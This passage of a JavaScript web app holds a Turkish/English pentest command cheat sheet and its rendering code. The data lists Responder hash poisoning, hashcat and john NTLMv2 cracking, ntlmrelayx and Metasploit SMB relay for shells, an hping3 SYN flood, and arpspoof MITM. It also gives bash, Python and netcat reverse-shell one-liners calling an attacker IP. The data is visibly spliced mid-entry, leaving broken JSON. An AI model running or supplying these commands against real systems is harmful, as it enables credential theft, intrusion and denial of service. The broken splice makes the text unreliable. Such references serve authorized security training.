"Saldırı Adımları", "en": "Attack Steps" }, { "c": "GPO üzerinden LLMNR ve NBT-NS protokollerini tamamen devre dışı bırakın.", "tr": "Savunma (Defense)", "en": "Defense" }] }, { "name": "responder", "tr": "Ağdaki LLMNR, NBT-NS ve MDNS isteklerini zehirleyerek NTLMv2 hash'lerini yakalayan araç.", "en": "A tool that poisons LLMNR, NBT-NS and MDNS requests to capture NTLMv2 hashes.", "syntax": "responder -I <interface> [options]", "ex": [{ "c": "sudo responder -I tun0 -dwP", "tr": "Aktif zehirleme modu (DHCP, WPAD ve Proxy dahil)", "en": "Active poisoning mode (includes DHCP, WPAD, Proxy)" }, { "c": "sudo responder -I eth0 -rdwv", "tr": "LLMNR, NBT-NS ve MDNS zehirlemesini aktif et, detaylı çıktı (verbose)", "en": "Enable LLMNR, NBT-NS and MDNS poisoning, verbose output" }, { "c": "sudo responder -I eth0 -A", "tr": "Sadece pasif analiz modu (ağ gürültüsünü dinler, yanıt dönmez)", "en": "Analyze mode only (passive, listens to network noise)" }] }, { "name": "hashcat (NTLMv2 Kırma)", "tr": "Yakalanan NTLMv2 hash'lerini GPU gücüyle kırmak için hashcat kullanımı.", "en": "Using hashcat to crack captured NTLMv2 hashes with GPU power.", "syntax": "hashcat -m 5600 [hash_file] [wordlist] [rules]", "ex": [{ "c": "hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt", "tr": "NTLMv2 hash'ine rockyou sözlüğü ile saldırı", "en": "Attack NTLMv2 hash with rockyou wordlist" }, { "c": "hashcat -m 5600 hash.txt rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule", "tr": "Kurallarla kırma kapasitesini kat kat artır (rakam/sembol/büyük-küçük harf ekler)", "en": "Multiply cracking capacity with rules" }] }, { "name": "john (NTLMv2 Kırma)", "tr": "Yakalanan NTLMv2 hash'lerini CPU kullanarak kırmak (John the Ripper).", "en": "Cracking captured NTLMv2 hashes using CPU (John the Ripper).", "syntax": "john --format=netntlmv2 [hash_file] --wordlist=[wordlist]", "ex": [{ "c": "john --format=netntlmv2 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt", "tr": "John the Ripper ile NTLMv2 hash kırma", "en": "Crack NTLMv2 hash with John the Ripper" }] }, { "name": "ntlmrelayx.py", "tr": "Yakalanan hash'i kırmak yerine, SMB imzalama kapalı olan makinelere yansıtarak (relay) yetkisiz erişim sağlar.", "en": "Relays captured hashes to machines with SMB signing disabled to gain unauthorized access instead of cracking.", "syntax": "python3 ntlmrelayx.py -t <hedef_ip>", "ex": [{ "c": "python3 ntlmrelayx.py -t 192.168.1.50 -i", "tr": "Hash'i hedef makineye relay yap ve interaktif SMB shell elde et", "en": "Relay hash and get interactive SMB shell" }] }, { "name": "netexec (nxc) / crackmapexec", "tr": "Active Directory ortamlarında yanal hareket, kimlik doğrulama testleri ve bilgi toplama aracı.", "en": "A swiss army knife for pentesting Active Directory environments (lateral movement, auth testing, enumeration).", "syntax": "nxc [protokol] [hedef] -u [kullanıcı] -p [şifre]", "ex": [{ "c": "nxc smb 192.168.1.0/24", "tr": "Ağdaki SMB sunucularını ve domain bilgilerini tara", "en": "Scan for SMB servers and domain info in the network" }, { "c": "nxc smb 192.168.1.10 -u 'admin' -p 'Pass123' --local-auth", "tr": "Yerel admin erişimini test et ('Pwned!' dönerse yetkilidir)", "en": "Test local admin access ('Pwned!' means admin)" }] }, { "name": "SMB Relay Saldırıları", "tr": "Hedefin bize yolladığı (örn: Responder ile yönlendirilen) NTLM kimlik doğrulama isteğini kırıp çözmek yerine, başka bir makineye aynen yansıtarak (Relay) yetkisiz oturum açma.", "en": "Instead of cracking the NTLM auth request sent to us, reflecting (Relaying) it to another machine to gain unauthorized access.", "syntax": "impacket-ntlmrelayx / smb_relay", "ex": [{ "c": "impacket-ntlmrelayx -tf targets.txt -smb2support -i", "tr": "SMB İmzalama özelliği kapalı (SMB Signing Disabled) makinelerin bulunduğu listeye (targets.txt) hashleri yansıt ve interaktif shell (-i) bekle.", "en": "Relay hashes to a list of machines (targets.txt) with SMB Signing Disabled and wait for interactive shell (-i)." }, { "c": "use exploit/windows/smb/smb_relay\nset SMBHOST 192.168.1.50\nexploit", "tr": "Metasploit modülü kullanarak gelen SMB bağlantısını anında hedef makineye (SMBHOST) yansıt.", "en": "Use Metasploit module to instantly relay incoming SMB connection to target machine (SMBHOST)." }] }] }, { "cat": "networkAttacks", "cmds": [{ "name": "hping3 (Modem/Ağ DoS)", "tr": "Özel TCP/IP paketleri göndererek ağ donanımlarını (modem/router) kilitlemek veya test etmek için kullanılır.", "en": "Used to send custom TCP/IP packets to lock down or test network hardware (modem/router).", "syntax": "hping3 [options] [hedef]", "ex": [{ "c": "sudo hping3 -S -p 80 --flood [Modem_IP]", "tr": "Hedef IP'nin 80 portuna TCP SYN Flood saldırısı yaparak arayüzü kilitle", "en": "Lock interface by sending TCP SYN Flood to port 80 of target IP" }] }, { "name": "arpspoof (ARP Zehirlenmesi)", "tr": "Ağdaki cihazları kandırarak trafiği kendi üzerine çekme (MITM) aracı.", "en": "ARP Spoofing tool to trick network devices and intercept traffic (MITM).", "syntax": "arpspoof -i [arayüz] -t [hedef] [ağ_geçidi]" est Yaşam Döngüsü", "tr": "Sızma Testi Adımları: 1) Keşif (Recon), 2) Tarama (Scan/Enum), 3) Sömürü (Exploit), 4) Kalıcılık (Maintain Access), 5) İz Silme (Cover Tracks).", "en": "Penetration Testing Lifecycle.", "syntax": "Siber Güvenlik Kavramı", "ex": [{ "c": "Recon -> Scan -> Exploit -> Maintain -> Cover Tracks", "tr": "Döngü Sırası", "en": "Lifecycle Order" }] }, { "name": "Reverse & Bind Shell", "tr": "Reverse Shell: Kurban saldırgana bağlanır (Firewall atlatmak için iyidir). Bind Shell: Kurban port açar, saldırgan ona bağlanır.", "en": "Reverse Shell: Victim connects to attacker. Bind Shell: Victim opens port, attacker connects.", "syntax": "Siber Güvenlik Kavramı", "ex": [{ "c": "# Reverse Shell\nnc -lvp 4444 (Saldırgan dinler)\nnc <ip> 4444 -e /bin/sh (Kurban bağlanır)", "tr": "Reverse Shell Mantığı", "en": "Reverse Shell Logic" }] }, { "name": "Staged vs Non-Staged", "tr": "Staged (Kademeli): Önce küçük stager gider, asıl shell'i RAM'e çeker. Non-Staged: Tümü tek pakette gider (daha stabil olabilir).", "en": "Staged: Small stager fetches rest. Non-Staged: All at once.", "syntax": "Siber Güvenlik Kavramı", "ex": [{ "c": "windows/shell/reverse_tcp (Staged - Kademeli)\nwindows/shell_reverse_tcp (Non-Staged - Tek Parça)", "tr": "Metasploit Payload Örnekleri", "en": "Metasploit Payload Examples" }] }, { "name": "Payload Türü: reverse_tcp", "tr": "Kurban bilgisayarın, saldırganın bekleyen dinleyicisine (Listener) internet veya yerel ağ üzerinden ters bağlantı yapmasını sağlayan yük türüdür. Güvenlik duvarlarını aşmak için en çok bu tercih edilir.", "en": "Payload type that makes the victim computer connect back to the attacker's listener. Most preferred for evading firewalls.", "syntax": "windows/meterpreter/reverse_tcp", "ex": [{ "c": "set PAYLOAD linux/x86/meterpreter/reverse_tcp\nset LHOST [Kendi_IP]", "tr": "Kurban makinedeki payload çalışınca doğrudan bizim IP adresimize ağ bağlantısı kurar.", "en": "When the payload on the victim machine runs, it establishes a network connection directly to our IP address." }] }, { "name": "Payload Türü: jsp_shell_bind_tcp", "tr": "Kurban makinede (genellikle Tomcat/Java) belirli bir portu dışarıya açarak dinlemeye alan (Bind Shell) ve bizim o porta bağlanmamızı bekleyen Java tabanlı payload.", "en": "Java-based payload that opens a specific port on the victim machine (usually Tomcat/Java) and waits for us to connect (Bind Shell).", "syntax": "java/jsp_shell_bind_tcp", "ex": [{ "c": "set PAYLOAD java/jsp_shell_bind_tcp\nset LPORT 4444", "tr": "Hedef makinede 4444 portu dışarı açılır. Saldırgan netcat (nc [hedef] 4444) ile bu porta gidip shell alır.", "en": "Port 4444 is opened on the target machine. Attacker uses netcat to connect and get shell." }] }, { "name": "Reverse Shell Cheatsheet", "tr": "Farklı dillerde (Bash, Python, Netcat) hedef makineden saldırgana ters bağlantı (Reverse Shell) alma komutları.", "en": "Commands to get a reverse shell from target to attacker in various languages (Bash, Python, Netcat).", "syntax": "Çeşitli dillerde payloadlar", "ex": [{ "c": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "tr": "Bash Reverse Shell (Saldırganın IP'si 10.0.0.1, Port 4444)", "en": "Bash Reverse Shell (Attacker IP 10.0.0.1, Port 4444)" }, { "c": "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'", "tr": "Python Reverse Shell", "en": "Python Reverse Shell" }, { "c": "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 >/tmp/f", "tr": "Netcat (nc) mkfifo Reverse Shell (Hedefte nc'nin -e parametresi yoksa kullanılır)", "en": "Netcat (nc) mkfifo Reverse Shell (Used if target's nc lacks -e flag)" }] }] }];

    const el = (id) => document.getElementById(id);
    const q = (sel) => document.querySelector(sel);
    const qa = (sel) => document.querySelectorAll(sel);

    function escapeHtml(str) {
      if (!str) return '';
      return str.replace(/[&<>'"]/g, char => ({
        '&': '&amp;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '"': '&quot;'
      }[char]));
    }

    function render() {
      const t = dict[currentLang];
      document.title = t.title;
      el('app-title').textContent = t.title;
      el('search-input').placeholder = t.search;
      el('no-results').textContent = t.noResults;
      el('footer-text').innerHTML = t.developedBy;
      el('about-title').textContent = t.about;
      el('about-text').innerHTML = t.developedBy;

      const aside = el('category-list');
      aside.innerHTML = '';
      db.forEach(cat => {
        const btn = document.createElement('button');
        btn.className = 'category-btn';
        btn.dataset.target = 'sec-' + cat.cat;
        btn.innerHTML = '<span>' + t.cat[cat.cat] + '</span><span class="badge">' + cat.cmds.length + '</span>';
        btn.onclick = () => {
          const target = el('sec-' + cat.cat);
          if (target) {
            const offset = target.getBoundingClientRect().top + window.scrollY - 120;
            window.scrollTo({ top: offset, behavior: 'smooth' });
          }
        };
        aside.appendChild(btn);
      });

      const content = el('main-content');
      content.innerHTML = '';
      db.forEach(cat => {
        const sec = document.createElement('section');
        sec.className = 'category-section';
        sec.id = 'sec-' + cat.cat;

        const h2 = document.createElement('h2');
        h2.className = 'category-title';
        h2.textContent = t.cat[cat.cat];
        sec.appendChild(h2);

        const grid = document.createElement('div');
        grid.className = 'commands-grid';

        cat.cmds.forEach(cmd => {
          const card = document.createElement('article');
          card.className = 'command-card search-item';
          card.dataset.cmd = cmd.name.toLowerCase();
          card.dataset.desc = cmd[currentLang].toLowerCase();

          let exHtml = '';
          cmd.ex.forEach(ex => {
            exHtml += '<div class="ex-item"><div class="ex-item-desc">' + escapeHtml(ex[currentLang]) + '</div><div class="code-block"><button class="copy-btn" aria-label="' + t.copy + '" onclick="copyCode(this)">' + svgCopy + '</button><pre><code>' + escapeHtml(ex.c) + '</code></pre></div></div>';
